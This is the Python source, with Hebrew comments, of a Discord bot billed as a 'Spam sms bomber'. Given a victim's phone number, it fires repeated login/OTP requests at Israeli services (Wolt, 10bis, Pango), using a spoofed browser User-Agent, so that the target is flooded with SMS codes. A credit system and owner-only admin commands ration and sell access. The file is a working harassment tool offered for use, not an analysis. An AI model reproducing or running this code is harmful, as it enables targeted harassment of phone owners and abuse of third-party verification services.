import discord
from discord.ext import commands
from discord import app_commands
import os
import httpx
import asyncio

# הגדרות
TOKEN = os.getenv("DISCORD_TOKEN")
OWNER_ROLE_NAME = "Owner"

class MyBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.message_content = True
        intents.members = True
        super().__init__(command_prefix="!", intents=intents)
        self.blacklist = []
        self.user_credits = {}

    async def setup_hook(self):
        await self.tree.sync()
        print(f"✅ הפקודות סונכרנו עבור {self.user}")

bot = MyBot()

# --- מנוע הספאם (האתרים מהסרטון) ---
async def send_israeli_spam(phone):
    formatted_phone = f"0{phone[-9:]}"
    apis = [
        {"name": "Wolt", "url": "https://api.wolt.com/v1/user/login/otp", "json": {"phone": f"+972{formatted_phone[1:]}"}},
        {"name": "10bis", "url": "https://www.10bis.co.il/NextApi/User/Login", "json": {"phoneNumber": formatted_phone, "isSmsAuth": True}},
        {"name": "Pango", "url": "https://pango.co.il/api/auth/login", "json": {"phone": formatted_phone}}
    ]
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
    
    async with httpx.AsyncClient(headers=headers, timeout=10.0) as client:
        tasks = [client.post(api["url"], json=api["json"]) for api in apis]
        responses = await asyncio.gather(*tasks, return_exceptions=True)
        for i, resp in enumerate(responses):
            name = apis[i]["name"]
            status = resp.status_code if hasattr(resp, 'status_code') else "Error"
            print(f"[LOG] אתר: {name} | סטטוס: {status}")

# --- בדיקת רול Owner ---
def is_owner():
    async def predicate(interaction: discord.Interaction):
        role = discord.utils.get(interaction.user.roles, name=OWNER_ROLE_NAME)
        if role: return True
        await interaction.response.send_message("❌ פקודה זו מיועדת רק לרול Owner!", ephemeral=True)
        return False
    return app_commands.check(predicate)

# --- פקודת Setup (הפאנל המעוצב) ---
@bot.tree.command(name="setup", description="הצגת פאנל ההפצצה")
async def setup(interaction: discord.Interaction):
    embed = discord.Embed(
        title="Spam sms bomber | By Nehoray yosef Lidor belazada",
        description="**💣 Spam Phone**\n1 Credit = 35 seconds\n\n**💰 My Credits**\nCheck your balance",
        color=discord.Color.from_rgb(43, 45, 49) # צבע כהה כמו בדיסקורד
    )
    
    view = discord.ui.View()
    view.add_item(discord.ui.Button(label="Spam Phone", style=discord.ButtonStyle.primary, emoji="🚀", custom_id="spam_btn"))
    view.add_item(discord.ui.Button(label="My Credits", style=discord.ButtonStyle.secondary, emoji="💰", custom_id="credits_btn"))
    
    await interaction.response.send_message(embed=embed, view=view)

# --- פקודת Spam ---
@bot.tree.command(name="spam", description="הפצצת מספר טלפון")
async def spam(interaction: discord.Interaction, phone: str):
    await interaction.response.defer(ephemeral=True)
    
    if interaction.user.id in bot.blacklist:
        return await interaction.followup.send("🚫 אתה חסום בבלאק ליסט!")
    
    credits = bot.user_credits.get(interaction.user.id, 0)
    if credits <= 0:
        return await interaction.followup.send("❌ אין לך קרדיטים! פנה לאדמין.")

    await interaction.followup.send(f"🚀 מתחיל הפצצה על {phone}...")
    
    # מריץ 3 סבבים של שליחה לכל האתרים
    for _ in range(3):
        await send_israeli_spam(phone)
        await asyncio.sleep(10)
    
    bot.user_credits[interaction.user.id] -= 1
    await interaction.followup.send(f"✅ ההפצצה הסתיימה! נשאר לך {bot.user_credits[interaction.user.id]} קרדיטים.")

# --- פקודות ניהול (Admin Commands) ---
@bot.tree.command(name="add_credits", description="הוספת קרדיטים למשתמש")
@is_owner()
async def add_credits(interaction: discord.Interaction, user: discord.Member, amount: int):
    bot.user_credits[user.id] = bot.user_credits.get(user.id, 0) + amount
    await interaction.response.send_message(f"💰 הוספת {amount} קרדיטים ל-{user.mention}")

@bot.tree.command(name="bl_add", description="הוספה לבלאק ליסט")
@is_owner()
async def bl_add(interaction: discord.Interaction, user: discord.Member):
    if user.id not in bot.blacklist:
        bot.blacklist.append(user.id)
        await interaction.response.send_message(f"🚫 {user.mention} נוסף לבלאק ליסט.")

@bot.tree.command(name="bl_remove", description="הסרה מבלאק ליסט")
@is_owner()
async def bl_remove(interaction: discord.Interaction, user: discord.Member):
    if user.id in bot.blacklist:
        bot.blacklist.remove(user.id)
        await interaction.response.send_message(f"✅ {user.mention} הוסר מהבלאק ליסט.")

bot.run(TOKEN)
